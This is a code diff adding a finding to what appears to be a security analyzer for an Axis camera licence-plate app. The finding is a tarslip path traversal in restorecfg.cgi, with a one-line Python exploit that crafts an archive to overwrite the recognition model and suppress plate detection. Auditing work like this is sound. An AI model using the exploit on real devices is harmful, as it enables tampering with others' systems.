@@ -727,6 +727,26 @@ class AxisEAPAnalyzer:
                     'impact': 'Cloud exfil endpoint credentials; proxy credential exposure',
                     'severity': 'MEDIUM',
                 },
+                {
+                    'id': 'LPV-7',
+                    'title': 'Tarslip in restorecfg.cgi — path traversal via backup archive restore',
+                    'cgi': 'restorecfg.cgi (admin)',
+                    'mechanism': (
+                        'binary: tar zxvf /tmp/backup.zip -C /tmp/ — no path traversal sanitization. '
+                        'Craft backup.zip with ../../<target_path> entries to write arbitrary files '
+                        'outside /tmp. APPUSR=sdk but sdk has write access to /usr/local/packages/; '
+                        'overwrite fflprapp config, models/*.tflite, or any sdk-writable path.'
+                    ),
+                    'exploit': (
+                        'python: import tarfile; t=tarfile.open("b.tar.gz","w:gz"); '
+                        'ti=tarfile.TarInfo("../../usr/local/packages/fflprapp/models/onnx_model_full_integer_quant.tflite"); '
+                        'ti.size=len(payload); t.addfile(ti, io.BytesIO(payload)); t.close(); '
+                        'POST b.tar.gz to restorecfg.cgi'
+                    ),
+                    'impact': 'Arbitrary file write as sdk user; model swap → plate suppression; config override',
+                    'severity': 'HIGH',
+                    'prerequisite': 'Admin-level auth',
+                },
             ],
             'cloud_integrations': {
                 'cloud1': 'cloud_config — generic HTTP cloud; auth_type selectable; events: new/lost/update/reliable/on_list/on_direction/on_roi',
